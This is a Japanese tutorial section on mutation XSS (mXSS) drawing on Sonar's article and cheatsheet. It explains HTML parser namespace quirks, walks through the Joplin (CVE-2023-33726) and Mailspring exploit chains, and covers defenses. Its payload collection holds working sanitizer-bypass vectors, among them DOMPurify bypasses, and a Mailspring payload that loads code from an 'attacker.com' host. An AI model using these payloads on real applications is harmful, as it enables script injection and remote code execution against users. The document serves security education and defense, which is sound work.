## mXSS解説とチートシート（Sonar）

このセクションでは、セキュリティ企業 Sonar（旧 SonarSource）が公開した2つの資料 ―― 解説記事「mXSS: The Vulnerability Hiding in Your Code」と、GitHub 上の「SonarSource/mxss-cheatsheet（mXSS チートシート）」―― を軸に、**mXSS（Mutation XSS、変異型クロスサイトスクリプティング）** を体系的に学びます。加えて、Sonar が発見した実在の脆弱性である **Joplin（CVE-2023-33726）** と **Mailspring（mXSS→RCE チェーン）** のケーススタディを通じて、mXSS が「アラートを出す遊び」ではなく **OS レベルの侵害に直結しうる脅威** であることを確認します。

反射型XSSのような「入力した文字列がそのまま実行される」タイプとは違い、mXSSは「サニタイズ（入力に含まれる危険な文字列を無害な形に変換・除去する処理）を通過した"安全に見える"文字列が、ブラウザによって再解釈される瞬間に危険なコードへ"変異（mutation）"する」という、より一段深い現象を扱います。ここが本セクション最大の学びどころです。

---

### mXSS（Mutation XSS）とは何か ―― 核心の一文

mXSS の核心は次の一文に集約されます。

> **サニタイザ（無害化処理）の目には「ただのテキスト（raw text）」として映る文字列を、ブラウザに渡した瞬間に「HTMLタグ」として解釈させる方法を見つけること。**

- **通常のXSS**: 攻撃者の `<script>` や `onerror=` が、フィルタの不備を"すり抜けて"そのまま出力される。
- **mXSS**: 攻撃文字列はサニタイズの段階では**確かに無害**である（サニタイザは正しく仕事をしている）。ところがその「無害化済みHTML文字列」を**ブラウザが描画のために再びパース（構文解析）し直す**とき、HTMLパーサの"癖"によって文字列の構造が組み替えられ（＝mutation／変異）、結果として `<img onerror=...>` のような実行可能な要素が出現してしまう。

つまり mXSS は「フィルタのバグ」ではなく、**"サニタイザが見たDOMツリー" と "ブラウザが最終的に構築したDOMツリー" が食い違う** という、パーサ（構文解析器）の仕様レベルの落とし穴を突きます。ここでいう **DOM（Document Object Model、HTMLをブラウザがツリー構造として保持したもの）** が、同じ入力文字列から2回作られるのに一致しない、という点が本質です。

Sonar の記事が強調する通り、**「マークアップへのいかなる小さな変更も、最終的なDOMツリーに大きな影響を与えうる（Any small change to the markup could have a major impact on the final DOM tree）」**。この事実が mXSS を強力かつ防御困難にしています。

#### 歴史的経緯（なぜ「mutation」と呼ぶのか）

- **2007年**: Yosuke Hasegawa（長谷川陽介）氏が、Internet Explorer で `innerHTML`（要素の中身をHTML文字列として読み書きするプロパティ）を読み戻すと文字列が"勝手に書き換わる"挙動を最初に報告。これが mXSS の原点とされます。
- **2013年**: Mario Heiderich らの論文 *"mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations"*（ACM CCS 2013）が、この現象を体系化し **mXSS** と名付けました。論文は、当時広く使われていたサーバサイドのサニタイザ（HTML Purifier, kses, htmlLawed, Google Caja 等）、クライアント側フィルタ（旧 IE XSS Filter、Chrome XSS Auditor）、WAF、IDS/IPS のいずれもが mXSS ベクタで回避されうることを示し、大きな衝撃を与えました。

> 出典: mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations（Heiderich et al., ACM CCS 2013） — https://cure53.de/fp170.pdf

---

### Sonar の4分類 ―― mXSS パターンの体系化

Sonar の記事「mXSS: The Vulnerability Hiding in Your Code」は、mXSS を理解のために **4つのサブカテゴリ** に分割して整理しています。

#### 1. Parser Differentials（パーサ差分）

**サニタイザのパーサとブラウザのパーサの解釈が異なる**ことを突くパターンです。

最も有名な例が `<noscript>` 要素の挙動差です。`<noscript>` の中身がどう解釈されるかは、**JavaScript が有効か無効か（scripting フラグ）** によって変わります。

- サニタイザ内部で使われる `DOMParser` API はスクリプト無効とみなすため、`<noscript>` の中身を **raw text（ただのテキスト）** として扱う。
- 実ページではスクリプト有効なので、`<noscript>` の中身が **通常のHTMLとして解釈・実行される**。

```html
<noscript><style></noscript><img src=x onerror="alert(1)">
```

サニタイザは `</noscript>` までを `<noscript>` 内のテキストとみなし、`<img onerror>` もそのテキストの一部として無害と判断する。ところが実ページでは `<noscript>` の中身がHTMLとして解釈されるため、`<img onerror>` が本物の要素として出現し発火する。

#### 2. Parsing Round Trip（パース往復）

**HTMLをシリアライズ（文字列化）し、再びパースすると、異なるDOMツリーが生成される**パターンです。HTML仕様上、シリアライズ→再パースは冪等（べきとう＝何回やっても同じ結果になる性質）ではありません。

代表例はフォームの入れ子です。HTML仕様では `<form>` を入れ子にすることはできません。

```html
<form id="outer"><div></form><form id="inner"><input>
```

1回目のパースでは、2つ目の `<form>` は無視され、`<input>` は `outer` のフォームの子になります。しかしこのDOMをシリアライズして再パースすると、`</form>` で `outer` が閉じられた後に `inner` が有効な新しいフォームとして解釈され、**DOM構造が変わります**。

この性質を名前空間混同と組み合わせた高度なペイロードが以下です。

```html
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

`<form>` の入れ子不可ルール、MathMLテキスト統合点（`<mtext>`）、`<mglyph>` の名前空間例外、`<style>` の raw text 解釈差を**直列に積み上げて**、サニタイザが見るDOMとブラウザが最終的に構築するDOMの間に最大の差分を作り出します。

#### 3. Desanitization（脱サニタイズ）

**サニタイズ後の処理が、無害化を台無しにする**パターンです。サニタイザ自体は正しく動作しているが、アプリケーションがサニタイズ済みHTMLに対して後から加工（要素の名前変更、属性の付け替え、文字列連結、別ライブラリへの再投入など）を行うことで、注入ベクタが復活します。

たとえば、サニタイズ後に SVG 要素の名前を変更すると、その要素の名前空間コンテキストが変わり、内部の `<style>` の解釈が raw text から通常のマークアップへ切り替わる ―― という形で変異が発生します。

このパターンで脆弱性が発見された実在のアプリケーションには、**osTicket**、**Mailspring**、**ProtonMail**、**Tutanota Desktop**、**Skiff Email** が含まれます。

#### 4. Context-Dependent Parsing（文脈依存パース）

**サニタイザがフラグメント（HTML断片）を解析する文脈と、アプリケーションが最終的にそのHTMLを埋め込む文脈が異なる**パターンです。

たとえばサニタイザは通常の HTML 文脈でフラグメントを解析しますが、アプリケーションがそのサニタイズ済みHTMLを SVG 名前空間の内部に挿入すると、`<style>` の解釈が変わり変異が発生します。ブラウザ間でもフラグメント解析の挙動に差異があり（後述のブラウザ差分を参照）、これも攻撃面を広げます。

> 出典: mXSS: The Vulnerability Hiding in Your Code（Sonar） — https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/

---

### ブラウザ HTMLパーサの再解釈メカニズム（原理編）

mXSS を"暗記"ではなく"理解"するには、**なぜ再パースで構造が変わるのか**をパーサの仕組みで押さえる必要があります。以下、mXSS を生む主要なメカニズムを分解します。

#### HTML コンテンツの7つのパース分類

HTMLパーサは要素を7つのカテゴリに分類し、それぞれ異なるルールで中身を解釈します。

| カテゴリ | 該当する要素の例 | 中身の扱い |
|---|---|---|
| **Void 要素** | `img`, `input`, `br`, `hr`, `meta` | 中身を持てない（自己閉じ） |
| **Raw text 要素** | `script`, `style`, `iframe` | テキストのみ。エンティティもデコードしない |
| **Escapable raw text** | `textarea`, `title` | テキストのみだがエンティティはデコードする |
| **Foreign content** | `svg`, `math` | 別の名前空間のルールで解釈 |
| **Normal 要素** | `div`, `span`, `p` 等 | 通常のHTMLマークアップとして解釈 |

mXSS の核心は、**同じ要素（典型的には `<style>`）が、所属する名前空間によって上記のどのカテゴリに分類されるかが変わる** ことにあります。

#### 名前空間（namespace）の切り替え ―― HTML / SVG / MathML

HTMLパーサは、DOMツリーの各要素に **名前空間（namespace）** という属性を割り当てます。名前空間は3種類あります。

- **HTML 名前空間**（既定）
- **SVG 名前空間**（`<svg>` 以下）
- **MathML 名前空間**（`<math>` 以下）

SVG と MathML の中身は **foreign content（外来コンテンツ＝HTML以外の文法で解釈される領域）** として扱われ、**通常のHTMLとは異なるパースルールが適用されます**。

この差が最もはっきり出るのが `<style>` 要素の扱いです。

| 文脈 | `<style>` の中身の扱い | 子要素を持てるか |
|---|---|---|
| **HTML 名前空間** | raw text（テキストのみ） | 持てない |
| **foreign content（SVG/MathML内）** | 通常のHTMLとして解釈しうる | **子要素を持てる** |

HTML 名前空間では `<style>` 内に書かれた `<img onerror=...>` はただのテキストです。ところが SVG 名前空間内の `<style>` では同じ文字列が**本物のHTML要素**として解釈されます。

```html
<svg><style><a alt="</style><img src=x onerror=alert(1)>">
```

このペイロードでは、SVG 内の `<style>` がもはや raw text 要素ではないため、`</style>` が閉じタグとして機能し、続く `<img onerror>` が実行可能な要素として出現します。

#### インテグレーションポイント（integration points）

名前空間はどこでも自由に切り替わるわけではなく、**インテグレーションポイント（integration point、＝外来コンテンツの中に"HTMLの島"を作れる境界要素）** で HTML に戻れます。

**SVG の HTML integration points:**
- `<foreignObject>`, `<desc>`, `<title>`

**MathML の HTML integration points（テキスト統合点）:**
- `<mi>`, `<mo>`, `<mn>`, `<ms>`, `<mtext>`

**`<annotation-xml>`** は `encoding` 属性が `text/html` または `application/xhtml+xml` の場合にのみ HTML integration point として機能し、SVG を直接の子要素としてのみ埋め込めます。

#### `<mglyph>` と `<malignmark>` の罠

**`<mglyph>` と `<malignmark>`** は特殊な挙動を示します。MathML テキスト統合点（`<mi>`, `<mo>` 等）の**直接の子要素**である場合に限り、MathML 名前空間に留まります。他の要素は既定で HTML 名前空間になるのに対して例外的な挙動です。攻撃者は「HTML島の中にあるはずなのに、この2要素だけは MathML 側に引き戻される」という非対称性を使って、サニタイザの名前空間判定を欺きます。

#### `<image>` 要素の名前空間ブレーカー

SVG 名前空間内で `<image>` 要素が出現すると、ブラウザはこれを `<img>` に変換します。`<img>` は **foreign content breaker（外来コンテンツ脱出要素）** であるため、SVG 名前空間から HTML 名前空間へ強制的に切り替わります。

#### Foreign Content Breakers（外来コンテンツ脱出要素）一覧

以下の要素が foreign content（SVG/MathML）の中に出現すると、パーサは外来コンテンツを終了し HTML 名前空間に戻ります。

> `b`, `big`, `blockquote`, `body`, `br`, `center`, `code`, `dd`, `div`, `dl`, `dt`, `em`, `embed`, `h1`〜`h6`, `head`, `hr`, `i`, `img`, `li`, `listing`, `menu`, `meta`, `nobr`, `ol`, `p`, `pre`, `ruby`, `s`, `small`, `span`, `strong`, `strike`, `sub`, `sup`, `table`, `tt`, `u`, `ul`, `var`

これらの要素を意図的に foreign content 内に配置することで、名前空間の切り替えを制御し、サニタイザの予測と異なるDOMツリーを作り出すのが mXSS の常套手段です。

> 出典: mXSS cheatsheet（SonarSource） — https://sonarsource.github.io/mxss-cheatsheet/

---

### SonarSource mXSS チートシート ―― 要素ごとの予期しない挙動

SonarSource の mXSS チートシート（`sonarsource.github.io/mxss-cheatsheet`）は、「ブラウザのHTMLパース時の癖が引き起こす mutation を深掘りするためのワンストップ資料」として、要素ごとの予期しない挙動を網羅的に整理しています。

#### HTML 名前空間の要素

**Select:**
`<select>` 内に許可されない要素が出現すると、パーサはその要素を**削除**します。

```
入力:  <select><a>text</a></select>
結果:  <select>text</select>     ← <a> が消える
```

**Form（入れ子不可）:**
`<form>` は入れ子にできません。ただし `<div>` で分断すると2つ目のフォームが有効になる場合があります。

```
入力:  <form id="outer"><div></form><form id="inner"><input>
結果:  （再パース時に inner が有効なフォームとして出現）
```

**Table（foster parenting／里子出し）:**
テーブル内に許可されない要素が出現すると、パーサはその要素を**テーブルの直前へ移動**させます。

```
入力:  <table><a>text</a></table>
結果:  <a>text</a><table></table>     ← <a> がテーブルの外へ追い出される
```

**Anchor（入れ子不可）:**
`<a>` 要素同士は入れ子にできません。Active Formatting Elements の再構築アルゴリズムにより構造が変わります。

**Headings（見出しの入れ子）:**
見出し要素は入れ子にすると分割されます。

```
入力:  <h1><h2>text</h2></h1>
結果:  <h1></h1><h2>text</h2>
```

**Noscript:**
前述の通り、JavaScript の有効/無効で中身の解釈が完全に変わります。サニタイザでは最も危険な要素の一つです。

**`<br>` と `<p>`:**
HTML仕様上、終了タグだけで要素を生成できる唯一の要素群です。

```
入力:  </p>
結果:  <p></p>     ← 終了タグだけで要素が生まれる
```

**Plaintext:**
`<plaintext>` はHTMLで閉じることができません。一度開くと文書末尾まですべてがテキストとして扱われます。

**Textarea:**
`<textarea>` の中身はデコードされます（RCDATA要素）。HTMLコメント `<!-- -->` は `<textarea>` 内では解釈されません。

**Active Formatting Elements:**
以下の要素は「Active Formatting Elements」として特別な再構築アルゴリズムの対象になります。

> `a`, `b`, `big`, `code`, `em`, `font`, `i`, `nobr`, `s`, `small`, `strike`, `strong`, `tt`, `u`

これらの要素が閉じられずに残った場合、パーサは暗黙的にこれらを再適用するため、予期しないDOM構造が生まれます。

**NULL バイト:**
HTMLパーサは NULL バイト（`\x00`）を **U+FFFD（REPLACEMENT CHARACTER、文字コード 65533）** に変換します。

#### SVG 名前空間の要素

**HTML Integration Points:**
`<foreignObject>`, `<desc>`, `<title>` の内部では HTML 名前空間に戻り、通常のHTMLとして解釈されます。

**`<image>` 要素:**
SVG内では `<image>` は許可されていますが、ブラウザは内部でこれを `<img>` に変換します。`<img>` は foreign content breaker であるため、SVG 名前空間から脱出するトリガーになります。

#### MathML 名前空間の要素

**HTML Integration Points（テキスト統合点）:**
`<mi>`, `<mo>`, `<mn>`, `<ms>`, `<mtext>` の内部では HTML 名前空間に戻ります。

**`<annotation-xml>`:**
SVG を埋め込めるのは**直接の子要素**としてのみです。

**`<mglyph>` / `<malignmark>`:**
HTML integration point の直接の子要素である場合に限り、MathML 名前空間に留まります（他の要素は HTML 名前空間になるのに対して例外）。

#### ブラウザ間の差異

同じHTMLでもブラウザによってDOMツリーの構築結果が異なるケースがあります。

```
入力:  <svg><div>text</div></svg>
```

| ブラウザ | 結果 |
|---|---|
| **Firefox** | `<svg><div>text</div></svg>` （`<div>` が SVG 内に留まる） |
| **Chrome / Safari 等** | `<svg></svg><div>text</div>` （`<div>` が SVG の外へ出る） |

この差異は、あるブラウザでは安全なペイロードが別のブラウザでは実行可能になりうることを意味し、サーバサイドのサニタイザにとって構造的な脅威です。

> 出典: mXSS cheatsheet（SonarSource） — https://sonarsource.github.io/mxss-cheatsheet/
> 出典: mXSS Explained（SonarSource） — https://sonarsource.github.io/mxss-cheatsheet/explained/

---

### 代表的なペイロード集

以下は、Sonar の記事・チートシートおよび権威ある研究から再現した代表的 mXSS ペイロードです。各ペイロードには **「なぜ動くのか」** を必ず添えます。

#### 例1: 古典 ―― `<listing>` / エンティティ・デコード（IE時代の原点）

```html
<listing>&lt;img src=1 onerror=alert(1)&gt;</listing>
```

- **なぜ動くのか**: 当時の IE は `<listing>`（古い整形済みテキスト要素）の `innerHTML` を読み戻すときにエンティティを `<`/`>` へデコードしてしまい、返り値が `<img src=1 onerror=alert(1)>` という本物のタグに変異した。文字列を再取得・再挿入するコードがあると、この変異した本物のタグが実行される。mXSS の"原点"となった挙動。

> 出典: mXSS Attacks（Heiderich et al., 2013） — https://cure53.de/fp170.pdf

#### 例2: `<noscript>` × scripting フラグ（Parser Differential）

```html
<noscript><style></noscript><img src=x onerror="alert(1)">
```

- **なぜ動くのか**: サニタイザ内部の `DOMParser` はスクリプト無効とみなすため、`<noscript>` の中身を raw text として扱い、`</noscript>` までをテキストとして素通しする。実ページはスクリプト有効なので、同じ文字列を再パースすると `<noscript>` の中身がHTMLとして再解釈され、`<style>` の後の `</noscript>` で `<noscript>` が閉じ、`<img onerror>` が本物の要素として出現・発火する。

#### 例3: Form + MathML + Style（Parsing Round Trip）

```html
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

- **なぜ動くのか**: `<form>` の入れ子不可ルールにより、1回目のパースと再パースで `</form>` の効き方が変わる。`<mtext>` は MathMLテキスト統合点、`<mglyph>` はその直下で MathML 名前空間に留まる例外要素。`<style>` が MathML の foreign content 内にあるため raw text ではなくなり、`</math>` で名前空間が HTML に戻った後の `<img onerror>` が本物の要素として解釈される。複数のパース癖を直列に積み上げた高度なベクタ。

#### 例4: SVG × Style × 属性値（名前空間混同の典型）

```html
<svg><style><a alt="</style><img src=x onerror=alert(1)>">
```

- **なぜ動くのか**: SVG 名前空間内の `<style>` は raw text 要素ではない。したがって `<a>` の `alt` 属性値に含まれる `</style>` が、シリアライズ→再パースの過程で本物の閉じタグとして機能し、続く `<img onerror>` が HTML 要素として出現する。後述の Joplin（CVE-2023-33726）はまさにこのペイロードで攻略された。

#### 例5: DOMPurify < 2.0.17 名前空間混同（Michał Bentkowski）

```html
<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
```

- **なぜ動くのか**: `<form>` の入れ子と MathML/SVG の名前空間切り替えを組み合わせ、DOMPurify のパースと実ブラウザのパースで `<style>` の閉じ位置と要素の所属名前空間がズレるように仕組む。DOMPurify（2.0.17 未満）は `<style>` の中身を raw text として安全と判断するが、シリアライズ→再パースの過程で `</style>` が本物の閉じタグとして効き、`<img onerror>` が独立したHTML要素として蘇る。

> 出典: Mutation XSS via namespace confusion – DOMPurify +2.0.17 bypass（Michał Bentkowski / Securitum） — https://www.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass.html

#### 例6: DOMPurify < 2.2.2「From SVG and back」（Daniel Santos）

```html
<svg></p><textarea><title><style></textarea><img src=x onerror=alert(1)></style></title></svg>
```

- **なぜ動くのか**: `<svg>` で SVG 名前空間に入ると `<style>` の子孫は通常のHTMLとして描画されうる。`</p>` や `<textarea>`/`<title>`（RCDATA要素）を挟んでパース状態を意図的にずらし、SVG から HTML へ"戻る"境界の解釈差で `<img onerror>` を実体化させる。DOMPurify 2.2.2 で修正。

> 出典: From SVG and back, yet another mutation XSS via namespace confusion for DOMPurify < 2.2.2 bypass（Daniel Santos） — https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f

---

### ケーススタディ①: Joplin（CVE-2023-33726）―― mXSS から任意コマンド実行へ

**Joplin** はオープンソースのノートアプリで、Electron（Chromiumベースのデスクトップアプリケーションフレームワーク）上で動作します。

#### 脆弱性の原因

Joplin はHTMLサニタイズに **htmlparser2** という npm パッケージを使用していました。このパッケージは **「仕様準拠よりも速度を優先する（doesn't follow the specification and prefers speed over accuracy）」** という設計方針をとっており、ブラウザの HTML パーサとは異なる解釈をするケースがありました。

#### 攻撃ペイロード

```html
<svg><style><a alt="</style><img src=x onerror=alert(1)>">
```

htmlparser2 はこの入力を解析する際、SVG 名前空間内の `<style>` を HTML 名前空間と同様に raw text として扱い、中身をただのテキストと判断しました。しかし Electron（Chromium）のHTMLパーサは仕様に忠実に SVG 内の `<style>` を foreign content として扱うため、`</style>` が閉じタグとして機能し、`<img onerror>` が本物の要素として出現しました。

#### 影響範囲

Joplin は Electron 上で動作し、Node.js へのアクセス権限を持っていたため、mXSS による JavaScript 実行は **任意のコマンド実行（RCE: Remote Code Execution）** に直結しました。ノートアプリに悪意のあるHTMLを含むノートを共有するだけで、被害者のマシン上で任意のコマンドが実行される危険がありました。

この事例は、mXSS が単なる「ブラウザでアラートが出る」レベルの問題ではなく、デスクトップアプリでは **OS レベルの侵害に直結する** ことを明確に示しています。

> 出典: mXSS: The Vulnerability Hiding in Your Code（Sonar） — https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/

---

### ケーススタディ②: Mailspring ―― mXSS → サンドボックス脱出 → RCE

Sonar が発見した Mailspring（デスクトップメールクライアント、Electron製）の脆弱性は、mXSS を起点とした多段階の攻撃チェーンで **RCE（任意コマンド実行）** に至った事例です。

#### 攻撃チェーンの全体像

**ステップ1 ―― mXSS（SVG/style のパーサ差分）:**
攻撃者は SVG 内の `<style>` を利用した mXSS ペイロードを含むメールを送信します。

**ステップ2 ―― サンドボックスの初期防御:**
メールの初回表示時は、コンテンツがサンドボックス化された iframe 内にレンダリングされるため、JavaScript は実行されません。

**ステップ3 ―― 返信/転送によるサンドボックス脱出:**
被害者がそのメールに**返信または転送**すると、メール本文がサンドボックスの外で再レンダリングされます。この再レンダリング時に mXSS による変異が発生し、JavaScript が実行可能になります。

**ステップ4 ―― CSP バイパスと二次サニタイズの回避:**
Mailspring の CSP（Content Security Policy）には設定ミスがあり、`<object>` タグが許可されていました。さらに、`<signature>` タグ（Mailspring 独自のカスタム要素）を使うことで二次的なサニタイズ処理を回避できました。

最終的なペイロード:

```html
<svg><style><a title="</style><signature><object data='attacker.com/payload'></object></signature>">
```

**ステップ5 ―― RCE への到達:**

2つの経路が存在しました。

- **経路A（Electron の既知脆弱性）**: Mailspring は Electron 17.4.0（Chrome 98 ベース）を使用しており、**CVE-2022-1364**（Chrome の型混同脆弱性）に対して脆弱でした。
- **経路B（CSS による情報窃取 → ファイルアクセス → コマンド実行）**: CSS の `url()` を使って添付ファイルのパスを外部に漏洩させ、same-origin のファイルアクセスを経由して `top.require('child_process').execSync('arbitrary_command')` により任意のコマンドを実行しました。

#### タイムライン

- 2023年4月27日: Sonar が初回報告
- 2023年7月4日: ベンダー承認
- 2023年7月29日: CSP の強化パッチ適用
- 2024年3月9日: Sonar がブログ記事を公開

影響を受けたバージョンは **Mailspring 1.11.0 未満** です。

この事例が示す教訓は明確です。**mXSS 単体は JavaScript 実行に過ぎないが、Electron アプリの特権的な実行環境、CSP の設定ミス、古いランタイムの既知脆弱性が連鎖すると、1通のメールで被害者のマシンを完全に掌握できる。**

> 出典: Reply to Calc: The Attack Chain to Compromise Mailspring（Sonar） — https://www.sonarsource.com/blog/reply-to-calc-the-attack-chain-to-compromise-mailspring/

---

### DOMPurify バイパスの歴史とバージョン依存（陳腐化への注意）

mXSS ペイロードは**サニタイザのバージョンに強く依存**します。以下は DOMPurify（最も広く使われるクライアントサイド・サニタイザ）の主要な mXSS 関連バイパスと修正の時系列です。

| 時期 | バイパスの種類 | 影響バージョン | 修正バージョン | 備考 |
|---|---|---|---|---|
| 2020 | MathML 名前空間混同（Bentkowski, 例5） | < 2.0.17 | **2.0.17** | 親名前空間の検証を導入 |
| 2020 | SVG 名前空間混同「From SVG and back」（Santos, 例6） | < 2.2.2 | **2.2.2** | SVG→HTML 境界の解釈差 |
| 2020–2021 | 追加の名前空間/mglyph 系（2.2.x で継続的に修正） | 2.2.x 系 | 2.2.3 / 2.2.4 / 2.2.6 ほか | いたちごっこが続いた時期 |
| 2024公開 | **ネスト（入れ子）ベース mXSS**（CVE-2024-47875） | 修正前の全般 | **2.5.0 / 3.1.3** | 深い入れ子で再パース挙動が発散 |
| 2025公開 | **テンプレートリテラル正規表現の不備**（CVE-2025-26791） | < 3.2.4 | **3.2.4** | `SAFE_FOR_TEMPLATES: true` 時のみ |
| 2025公開 | **`<textarea>` raw text 検証漏れ**（CVE-2025-15599） | 3.1.3–3.2.6 / 2.5.3–2.5.8 | **3.2.7**（3.x 系） | 2.x 系は未修正のまま |

**実務上の教訓:**

- **常に最新の DOMPurify へ更新する。** mXSS 修正は"追いつき"の連続であり、古い版に固定するとその後に発見された回避に必ず晒される。
- **2.x 系は一部 CVE（例: CVE-2025-15599）が未修正のまま**。2.x を継続利用しているプロジェクトは 3.x への移行を検討すべき。
- **非デフォルト設定は攻撃面を広げる**。`SAFE_FOR_TEMPLATES`（CVE-2025-26791）や `SAFE_FOR_XML`（CVE-2025-15599）のように、既定から外れたオプションが新たなバイパスの入口になった例が複数ある。

#### mXSS の影響を受けた他のサニタイザ

DOMPurify だけが mXSS の標的ではありません。Sonar の記事では以下のサニタイザにも脆弱性があったことが言及されています。

- **HtmlSanitizer**（CVE-2023-44390）
- **TYPO3**（CVE-2023-38500）
- **OWASP java-html-sanitizer**
- **Mozilla bleach**
- **Google Caja**
- **DOMPurify 2.0.0**

これらに共通するのは、**パーサの実装がブラウザのパーサと完全には一致しない** という構造的な問題です。

> 出典: Attack Classes & Bypass History（cure53/DOMPurify Wiki） — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History

---

### 防御策のまとめ

mXSS への対策は「サニタイザを信じきる」ことではなく、「**パーサ差分が生まれないように処理フロー全体を設計する**」ことです。Sonar の記事が推奨する防御策を軸に整理します。

#### 1. クライアントサイド・サニタイズ（最重要）

**描画するのと同じブラウザ上でサニタイズする。** サーバサイドのサニタイズは配信先ブラウザの多様さゆえにパーサ差分を排除できず、mXSS に構造的に弱い。クライアントサイド・サニタイザ（DOMPurify 等）を使えば、サニタイズとレンダリングが同じパーサで行われるため差分が最小化されます。

#### 2. 再パースの回避

**サニタイズ済みのDOMツリーを直接挿入する。** サニタイズ結果をHTML文字列にシリアライズしてから `innerHTML` で再挿入するのではなく、DOMツリーそのものを挿入すれば、シリアライズ→再パースのラウンドトリップで生じる変異を回避できます。

#### 3. サニタイズ後のエンコード

サニタイズ後にHTMLを文字列として扱う必要がある場合は、**raw content をエンコードする**。サニタイズ済み文字列に対して後から加工・連結・再パースを行わない（desanitization の回避）。

#### 4. Foreign content の制限

ユーザーHTMLに SVG/MathML を許可する必要がなければ、**SVG/MathML 要素を丸ごと削除する**。名前空間切り替えが発生しなければ、mXSS の最大の攻撃面が消滅します。

#### 5. 文脈の一貫性

サニタイザがフラグメントを解析する文脈と、アプリケーションがそのHTMLを埋め込む文脈を一致させる。たとえば、HTML 文脈でサニタイズしたHTMLを SVG 内に挿入しないようにする。

#### 6. Sanitizer API（ブラウザネイティブのサニタイズ）

**WICG（Web Incubator Community Group）で策定中の Sanitizer API** は、ブラウザ自身が提供するネイティブのサニタイズ機能です。ブラウザのパーサと完全に同じパーサでサニタイズが行われるため、パーサ差分の問題が原理的に解消されます。標準化が進めば、mXSS に対する最も根本的な解決策になり得ます。

#### 7. 多層防御

サニタイザは万能ではないことを前提に、以下を重ねます。

- **CSP（Content Security Policy）** で `script-src` を厳格化し、`'unsafe-inline'` を排除する。nonce/hash 方式を採用する。
- **Trusted Types** で `innerHTML` への生文字列代入を型レベルで禁止する。
- サニタイザは**常に最新版**を使い、依存の自動更新（Dependabot / Renovate 等）を運用に組み込む。

> 出典: mXSS: The Vulnerability Hiding in Your Code（Sonar） — https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/

---

### このセクションの要点（まとめ）

- mXSS の核心は **「サニタイザの目には raw text、ブラウザの目には HTML」** となる文字列を作ること。バグではなく**パーサ差分（parser differential）**という仕様レベルの落とし穴を突く。
- Sonar は mXSS を **4つのパターン** に分類した: **Parser Differentials（パーサ差分）**、**Parsing Round Trip（パース往復）**、**Desanitization（脱サニタイズ）**、**Context-Dependent Parsing（文脈依存パース）**。
- SonarSource mXSS チートシートは、HTML/SVG/MathML の各名前空間における要素の予期しない挙動（foster parenting、form の入れ子不可、foreign content breaker 等）を網羅的に整理した実務資料。
- **Joplin（CVE-2023-33726）** は、仕様非準拠のパーサ（htmlparser2）と Electron の Node.js 権限の組み合わせにより、mXSS が RCE に直結した事例。
- **Mailspring** は、mXSS → 返信/転送によるサンドボックス脱出 → CSP バイパス → RCE という多段階の攻撃チェーンで、1通のメールからマシンを掌握できた事例。
- 防御の中核は **クライアントサイド・サニタイズ**（同一パーサで無害化）、**再パースの回避**（DOMツリーの直接挿入）、**foreign content の制限**、**Sanitizer API への移行**。サニタイザの最新化と多層防御（CSP、Trusted Types）を必ず重ねる。

---

### 出典一覧

- mXSS: The Vulnerability Hiding in Your Code（Sonar） — https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/
- SonarSource / mxss-cheatsheet（GitHub / GitHub Pages） — https://github.com/SonarSource/mxss-cheatsheet / https://sonarsource.github.io/mxss-cheatsheet/
- mXSS Explained（SonarSource） — https://sonarsource.github.io/mxss-cheatsheet/explained/
- Reply to Calc: The Attack Chain to Compromise Mailspring（Sonar） — https://www.sonarsource.com/blog/reply-to-calc-the-attack-chain-to-compromise-mailspring/
- mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations（Heiderich et al., ACM CCS 2013） — https://cure53.de/fp170.pdf
- Mutation XSS via namespace confusion – DOMPurify +2.0.17 bypass（Michał Bentkowski / Securitum） — https://www.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass.html
- From SVG and back … DOMPurify < 2.2.2 bypass（Daniel Santos） — https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f
- Attack Classes & Bypass History（cure53/DOMPurify Wiki） — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
- Code Vulnerabilities Put Skiff Emails at Risk（Sonar） — https://www.sonarsource.com/blog/code-vulnerabilities-put-skiff-emails-at-risk
